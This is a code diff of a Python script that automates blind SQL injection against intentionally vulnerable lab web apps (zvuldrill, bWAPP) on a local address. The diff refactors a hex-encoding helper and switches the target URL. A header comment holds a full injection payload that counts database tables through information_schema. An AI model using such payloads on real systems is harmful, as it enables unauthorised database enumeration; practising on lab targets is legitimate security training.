@@ -5,19 +5,16 @@
 # http://192.168.52.128/test2/zvuldrill-master/search.php?search=1%'+or if((select count(*) from information_schema.tables where table_schema=0x7A76756C6472696C6C)=3,1,0)%23
 import urllib
 from urllib import request
-from data import glovar
+from global_data import glovar
+from global_data.glofun import string_convert_to_hex
+
 
 def get_tbcount(url='http://192.168.52.128/test2/zvuldrill-master/search.php?search=1', cookie=False, type='search',
                 dbname='zvuldrill'):
 
     response_length = 0
 
-    hex_dbname = ""
-
-    for i in dbname:
-        hex_dbname += hex(ord(i))
-
-    hex_dbname = '0x' + hex_dbname.replace('0x', '')
+    hex_dbname=string_convert_to_hex(dbname)
 
     # 查数据库test中表的个数 基础知识--这里的方法只使用与表的个数少于10的，要是多多于10的话substr(({sql}),2,1)要这样增加截取，或者substr(({sql}),1,2)
     if type == 'int':
@@ -47,6 +44,6 @@ def get_tbcount(url='http://192.168.52.128/test2/zvuldrill-master/search.php?sea
 
 if __name__ == "__main__":
 
-    #get_tbcount(url=glovar.url3)
+    get_tbcount(url=glovar.url3)
 
-    get_tbcount(url=glovar.url4, cookie=glovar.cookie, type='int', dbname='bwapp')
+    #get_tbcount(url=glovar.url4, cookie=glovar.cookie, type='int', dbname='bwapp')
